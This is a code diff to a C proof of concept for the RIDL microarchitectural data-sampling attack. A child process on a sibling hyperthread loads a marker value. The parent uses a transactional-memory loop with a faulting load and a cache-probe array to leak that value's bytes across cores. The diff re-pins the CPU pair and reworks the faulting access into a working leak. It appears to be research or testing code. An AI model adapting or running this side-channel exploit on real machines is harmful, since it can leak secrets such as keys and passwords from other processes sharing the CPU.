@@ -8,11 +8,13 @@
 #include "cacheutils.h"
 #include "microarchitecture.h"
 
+__attribute__((aligned(0x1000))) uint64_t mval = 0xabababababababab;
+
 extern void __attribute__((noreturn)) load_magic_value(void* flush_target);
 
 int ridl_generic_c(uint32_t num_samples, uint32_t success_rate) {
     pid_t pid;
-    int pair[] = {2, 6};
+    int pair[] = {3, 7};
 
     uint32_t num_hits[0x100] = {0, };
 
@@ -28,15 +30,14 @@ int ridl_generic_c(uint32_t num_samples, uint32_t success_rate) {
     set_processor_affinity(pair[pid ? 0 : 1]);
     if (!pid) {
         prctl(PR_SET_PDEATHSIG, SIGHUP);
-        load_magic_value(load_magic_value);
-        __builtin_unreachable();
+        load_magic_value(&mval);
     }
     usleep(10000);
     flush_shared_memory();
 
     for(uint32_t i = 0; i < num_samples; i++) {
         if(try_start()) {
-            maccess(mem + *(size_t*)NULL * pagesize);
+            maccess(mem + (*(size_t*)((uintptr_t)&mval & 0b111111)) * pagesize);
             try_abort();
         }
         try_end();
